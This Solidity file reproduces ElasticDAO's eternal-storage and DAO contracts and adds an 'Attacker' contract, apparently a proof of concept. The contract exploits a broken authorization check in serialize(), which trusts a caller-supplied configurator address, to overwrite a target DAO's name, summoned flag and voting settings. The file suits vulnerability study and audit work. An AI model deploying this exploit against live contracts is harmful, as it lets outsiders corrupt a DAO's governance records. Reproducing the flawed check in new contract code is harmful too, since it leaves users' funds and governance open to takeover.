// SPDX-License-Identifier: GPLv3
pragma solidity 0.7.2;
pragma experimental ABIEncoderV2;

/**
 * @title Implementation of Eternal Storage for ElasticDAO -
 * - (https://fravoll.github.io/solidity-patterns/eternal_storage.html)
 * @author ElasticDAO - https://ElasticDAO.org
 * @notice This contract is used for storing contract network data
 * @dev ElasticDAO network contracts can read/write from this contract
 */
contract EternalModel {
  struct Storage {
    mapping(bytes32 => address) addressStorage;
    mapping(bytes32 => bool) boolStorage;
    mapping(bytes32 => bytes) bytesStorage;
    mapping(bytes32 => int256) intStorage;
    mapping(bytes32 => string) stringStorage;
    mapping(bytes32 => uint256) uIntStorage;
  }

  Storage internal s;

  /**
   * @notice Getter Functions
   */

  /**
   * @notice Gets stored contract data in unit256 format
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @return uint256 _value from storage _key location
   */
  function getUint(bytes32 _key) internal view returns (uint256) {
    return s.uIntStorage[_key];
  }

  /**
   * @notice Get stored contract data in string format
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @return string _value from storage _key location
   */
  function getString(bytes32 _key) internal view returns (string memory) {
    return s.stringStorage[_key];
  }

  /**
   * @notice Get stored contract data in address format
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @return address _value from storage _key location
   */
  function getAddress(bytes32 _key) internal view returns (address) {
    return s.addressStorage[_key];
  }

  /**
   * @notice Get stored contract data in bool format
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @return bool _value from storage _key location
   */
  function getBool(bytes32 _key) internal view returns (bool) {
    return s.boolStorage[_key];
  }

  /**
   * @notice Setters Functions
   */

  /**
   * @notice Store contract data in uint256 format
   * @dev restricted to latest ElasticDAO Networks contracts
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @param _value uint256 value
   */
  function setUint(bytes32 _key, uint256 _value) internal {
    s.uIntStorage[_key] = _value;
  }

  /**
   * @notice Store contract data in string format
   * @dev restricted to latest ElasticDAO Networks contracts
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @param _value string value
   */
  function setString(bytes32 _key, string memory _value) internal {
    s.stringStorage[_key] = _value;
  }

  /**
   * @notice Store contract data in address format
   * @dev restricted to latest ElasticDAO Networks contracts
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @param _value address value
   */
  function setAddress(bytes32 _key, address _value) internal {
    s.addressStorage[_key] = _value;
  }

  /**
   * @notice Store contract data in bool format
   * @dev restricted to latest ElasticDAO Networks contracts
   * @param _key bytes32 location should be keccak256 and abi.encodePacked
   * @param _value bool value
   */
  function setBool(bytes32 _key, bool _value) internal {
    s.boolStorage[_key] = _value;
  }
}


/**
 * @author ElasticDAO - https://ElasticDAO.org
 * @notice This contract is used for storing core DAO data
 * @dev ElasticDAO network contracts can read/write from this contract
 */
contract DAO is EternalModel {
  struct Instance {
    address uuid;
    address[] summoners;
    bool summoned;
    string name;
    uint256 maxVotingLambda;
    uint256 numberOfSummoners;
    EcosystemInstance ecosystem;
  }

  struct EcosystemInstance {
    address daoAddress;
    // Models
    address daoModelAddress;
    address ecosystemModelAddress;
    address tokenHolderModelAddress;
    address tokenModelAddress;
    // Services
    address configuratorAddress;
    // Tokens
    address governanceTokenAddress;
  }

  event Serialized(address indexed uuid);

  /**
   * @dev deserializes Instance struct
   * @param _uuid - address of the unique user ID
   * @return record Instance
   */
  function deserialize(address _uuid) //Ecosystem.Instance memory _ecosystem
  external
  view
  returns (Instance memory record)
  {
    record.uuid = _uuid;
    // record.ecosystem = _ecosystem;

    if (_exists(_uuid)) {
      record.maxVotingLambda = getUint(keccak256(abi.encode(_uuid, 'maxVotingLambda')));
      record.name = getString(keccak256(abi.encode(_uuid, 'name')));
      record.numberOfSummoners = getUint(keccak256(abi.encode(_uuid, 'numberOfSummoners')));
      record.summoned = getBool(keccak256(abi.encode(_uuid, 'summoned')));
    }

    return record;
  }

  /**
   * @dev checks if @param _uuid exists
   * @param _uuid - address of the unique user ID
   * @return recordExists bool
   */
  function exists(address _uuid) external view returns (bool) {
    return _exists(_uuid);
    //Ecosystem.Instance memory
  }

  function getSummoner(Instance memory _dao, uint256 _index) external view returns (address) {
    return getAddress(keccak256(abi.encode(_dao.uuid, 'summoners', _index)));
  }

  /**
   * @dev checks if @param _uuid where _uuid is msg.sender - is a Summoner
   * @param _dao DAO.Instance
   * @param _summonerAddress address
   * @return bool
   */
  function isSummoner(Instance memory _dao, address _summonerAddress) external view returns (bool) {
    return getBool(keccak256(abi.encode(_dao.uuid, 'summoner', _summonerAddress)));
  }

  /**
   * @dev serializes Instance struct
   * @param _record Instance
   */
  function serialize(Instance memory _record) external {
    require(
      msg.sender == _record.uuid || msg.sender == _record.ecosystem.configuratorAddress,
      'ElasticDAO: Unauthorized'
    );

    setUint(keccak256(abi.encode(_record.uuid, 'maxVotingLambda')), _record.maxVotingLambda);
    setString(keccak256(abi.encode(_record.uuid, 'name')), _record.name);
    setBool(keccak256(abi.encode(_record.uuid, 'summoned')), _record.summoned);

    if (_record.summoners.length > 0) {
      _record.numberOfSummoners = _record.summoners.length;
      setUint(keccak256(abi.encode(_record.uuid, 'numberOfSummoners')), _record.numberOfSummoners);
      for (uint256 i = 0; i < _record.numberOfSummoners; i += 1) {
        setBool(keccak256(abi.encode(_record.uuid, 'summoner', _record.summoners[i])), true);
        setAddress(keccak256(abi.encode(_record.uuid, 'summoners', i)), _record.summoners[i]);
      }
    }

    setBool(keccak256(abi.encode(_record.uuid, 'exists')), true);

    emit Serialized(_record.uuid);
  }

  function _exists(address _uuid) internal view returns (bool) {
    return getBool(keccak256(abi.encode(_uuid, 'exists')));
  }
}


interface IDAO {
  struct Instance {
    address uuid;
    address[] summoners;
    bool summoned;
    string name;
    uint256 maxVotingLambda;
    uint256 numberOfSummoners;
    EcosystemInstance ecosystem;
  }

  struct EcosystemInstance {
    address daoAddress;
    // Models
    address daoModelAddress;
    address ecosystemModelAddress;
    address tokenHolderModelAddress;
    address tokenModelAddress;
    // Services
    address configuratorAddress;
    // Tokens
    address governanceTokenAddress;
  }

  function serialize(Instance memory _record) external;
}


contract Attacker {

  constructor(address _dao, address _targetUuid) {
    IDAO daoStorage = IDAO(_dao);

    IDAO.EcosystemInstance memory ecosystem;
    // he thinks this is a real ecosystem?
    ecosystem.configuratorAddress = address(this);

    IDAO.Instance memory dao;
    // overwrite values in this record
    dao.uuid = _targetUuid;
    dao.ecosystem = ecosystem;
    dao.name = "R3KT";
    dao.maxVotingLambda = 69;
    dao.numberOfSummoners = uint(- 1);
    dao.summoned = true;

    // get rekt
    daoStorage.serialize(dao);
  }
}
